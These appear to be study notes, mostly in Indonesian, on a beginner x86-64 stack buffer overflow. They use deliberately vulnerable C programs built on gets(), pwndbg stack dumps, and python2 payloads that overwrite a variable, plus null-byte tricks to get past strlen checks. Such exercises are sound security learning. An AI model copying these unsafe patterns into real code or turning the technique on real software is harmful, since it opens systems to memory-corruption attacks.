# 3. Binary exploitation - overwrite variable stack (x86-64)

### buffer2.c
```c
#include <stdio.h>
#include <string.h>

int main (){
    int b = -1;
    char c[16];
    gets(&c);
    if(b == 0xdeadf00d){
        printf("You win!\n");
    }else {
        printf("You lose!\n");
        printf("b = %d\n", b);
    }
    return 0;
}
```
## Check main func
- disas main nya, and jump ke proses setelah setup stack
- ada di main+8
```c
pwndbg> disas main
Dump of assembler code for function main:
   0x0000000000401136 <+0>:	push   rbp
   0x0000000000401137 <+1>:	mov    rbp,rsp
   0x000000000040113a <+4>:	sub    rsp,0x20
   0x000000000040113e <+8>:	mov    DWORD PTR [rbp-0x4],0xffffffff
   0x0000000000401145 <+15>:	lea    rax,[rbp-0x20]
   0x0000000000401149 <+19>:	mov    rdi,rax
   0x000000000040114c <+22>:	mov    eax,0x0
   0x0000000000401151 <+27>:	call   0x401040 <gets@plt>
   0x0000000000401156 <+32>:	cmp    DWORD PTR [rbp-0x4],0xdeadf00d
   0x000000000040115d <+39>:	jne    0x401170 <main+58>
   0x000000000040115f <+41>:	mov    edi,0x402004
   0x0000000000401164 <+46>:	mov    eax,0x0
   0x0000000000401169 <+51>:	call   0x401030 <printf@plt>
   0x000000000040116e <+56>:	jmp    0x401193 <main+93>
   0x0000000000401170 <+58>:	mov    edi,0x40200e
   0x0000000000401175 <+63>:	mov    eax,0x0
   0x000000000040117a <+68>:	call   0x401030 <printf@plt>
   0x000000000040117f <+73>:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000401182 <+76>:	mov    esi,eax
   0x0000000000401184 <+78>:	mov    edi,0x402019
   0x0000000000401189 <+83>:	mov    eax,0x0
   0x000000000040118e <+88>:	call   0x401030 <printf@plt>
   0x0000000000401193 <+93>:	mov    eax,0x0
   0x0000000000401198 <+98>:	leave
   0x0000000000401199 <+99>:	ret
End of assembler dump.
pwndbg> break *main+8 
Breakpoint 1 at 0x40113e
pwndbg> run
```
- stack frame disini :
```c
00:0000│ rsp 0x7fffffffdb90 ◂— 0
01:0008│-018 0x7fffffffdb98 —▸ 0x7ffff7fe4780 ◂— push rbp
02:0010│-010 0x7fffffffdba0 ◂— 0
03:0018│-008 0x7fffffffdba8 —▸ 0x7fffffffdc40 ◂— 1 // ini
04:0020│ rbp 0x7fffffffdbb0 ◂— 1
```
- next, di ni atau si -> nilainya berubah
```c
00:0000│ rsp 0x7fffffffdb90 ◂— 0
01:0008│-018 0x7fffffffdb98 —▸ 0x7ffff7fe4780 ◂— push rbp
02:0010│-010 0x7fffffffdba0 ◂— 0
03:0018│-008 0x7fffffffdba8 ◂— 0xffffffffffffdc40 // ini
04:0020│ rbp 0x7fffffffdbb0 ◂— 1
05:0028│+008 0x7fffffffdbb8 —▸ 0x7ffff7dd7ca8 ◂— mov edi, eax
06:0030│+010 0x7fffffffdbc0 —▸ 0x7fffffffdcb0 —▸ 0x7fffffffdcb8 ◂— 0x38 /* '8' */
07:0038│+018 0x7fffffffdbc8 —▸ 0x401136 (main) ◂— push rbp
```

- pisah 8 byte masing2, di memory ID 0x7fffffffdba8
```c
pwndbg> x/8bx 0x7fffffffdba8
0x7fffffffdba8:	0x40	0xdc	0xff	0xff	0xff	0xff	0xff	0xff
```

- nanti biar ada input nya pakai step over biar bisa ada input :
> si: step into
> ni: next interaction
```c
pwndbg> ni
AAAAAAAA //buffer var c, 8/8
BBBBBBBB // 8/8 var c -> ini 16/16 atas bawah
CCCCCCCC // padding space
DDDDEEEE // -> 4/8, yg kanan (E) variable b, overwrite disini kalau mau win

00:0000│ rax rsp 0x7fffffffdb90 ◂— 'AAAAAAAABBBBBBBBCCCCCCCCDDDDEEEE'
01:0008│-018     0x7fffffffdb98 ◂— 'BBBBBBBBCCCCCCCCDDDDEEEE'
02:0010│-010     0x7fffffffdba0 ◂— 'CCCCCCCCDDDDEEEE'
03:0018│-008     0x7fffffffdba8 ◂— 'DDDDEEEE'
04:0020│ rbp     0x7fffffffdbb0 ◂— 0
```
- overwrite di address ini: 0x7fffffffdba8
```c
pwndbg> x/8bx 0x7fffffffdba8
0x7fffffffdba8:	0x44	0x44	0x44	0x44	0x45	0x45	0x45	0x45
pwndbg> continue
Continuing.
You lose!
b = 1162167621
[Inferior 1 (process 11743) exited normally]
```
- nah biar 0xdeadfood, per byte harus di reverse
```rs
de ad f0 0d -> 0d f0 ad de
```
- susun script:
```txt
A * 8, B * 8, C * 8, D * 4 atau pake 1 char aja biar gampang -> A * (8 + 8 + 8 + 4) -> A * 28
```
```bash
python2 -c "print 'A' * 28 + '\x0d\xf0\xad\xde'"
```
- and pipe
```bash
python2 -c "print 'A' * 28 + '\x0d\xf0\xad\xde'" | ./buffer64
```
- or kalau mau pakai echo bisa juga :
```bash
for i in {1..28}; do echo -n "A"; done; echo
simpen outputnya -> echo -e "[output tadi]\x0d\xf0\xad\xde" | ./buffer64
```

## next level - proteksi length (>)
- kasih proteksi ke string c gabole > 15 len str nya
```c
#include <stdio.h>
#include <string.h>

int main (){
    int b = -1;
    char c[16];
    gets(&c);

    if(strlen(c) > 15){
        printf("Hayo mau overflow ya\n");
    } else {
        if(b == 0xdeadf00d){
            printf("You win!\n");
        }else {
            printf("You lose!\n");
            printf("b = %d\n", b);
        }
    }
    return 0;
}

// compile with 64 bit, jadi gausa m32:
// gcc -no-pie -fno-pic -fno-stack-protector -fno-builtin buffer.c -o buffer32
// tambahin ini kalo error: -Wno-implicit-function-declaration
```
- then kita coba lagi yg tadi:
```bash
python2 -c "print 'A' * 28 + '\x0d\xf0\xad\xde'" | ./buffer64
Hayo mau overflow ya
```
- buat bypass strlen bisa pakai nullbyte -> \0, atau 0 atau \x00
- jadi kalau dibaca pas kotak ke 7 nullbyte, strlen bakal ngestop dan ga akan > 16
```bash
python2 -c "print '\x00' + 'A' * 27 + '\x0d\xf0\xad\xde'" | ./buffer64
```
## next level - proteksi length (!=) 8
- coba strlen nya bukan > 16, tapi != 8, kalau bukan 8 dia nolak
```c
#include <stdio.h>
#include <string.h>

int main (){
    int b = -1;
    char c[16];
    gets(&c);

    if(strlen(c) != 7){
        printf("Harus 7 inputnya yaelah\n");
    } else {
        if(b == 0xdeadf00d){
            printf("You win!\n");
        }else {
            printf("You lose!\n");
            printf("b = %d\n", b);
        }
    }
    return 0;
}

// compile with 64 bit, jadi gausa m32:
// gcc -no-pie -fno-pic -fno-stack-protector -fno-builtin buffer.c -o buffer32
// tambahin ini kalo error: -Wno-implicit-function-declaration
```

- then kita coba lagi yg tadi:
```bash
python2 -c "print '\x00' + 'A' * 27 + '\x0d\xf0\xad\xde'" | ./buffer64python2 -c "print '\x00' + 'A' * 27 + '\x0d\xf0\xad\xde'" | ./buffer64
Harus 7 inputnya yaelah
```
- bypass nya, atur len str awal sampai 7 (A * 7) + tambah nullbyte biar stop strlen dan bacanya length 7
- baru masukin sisanya and payloadnya
```bash
python2 -c "print 'A' * 7 + '\x00' + 'A' * 20 + '\x0d\xf0\xad\xde'" | ./buffer64
```
- then coba
```bash
python2 -c "print 'A' * 7 + '\x00' + 'A' * 20 + '\x0d\xf0\xad\xde'" | ./buffer64
You win!
```
- semua gara2 gets(), apakah kalau diganti scanf() tetap vuln
- bisa vuln tapi selektif, ada beberapa char yg bisa ngebuat dia stop baca: \x0a, \x0d, \x20, jadi lebih susah overwrite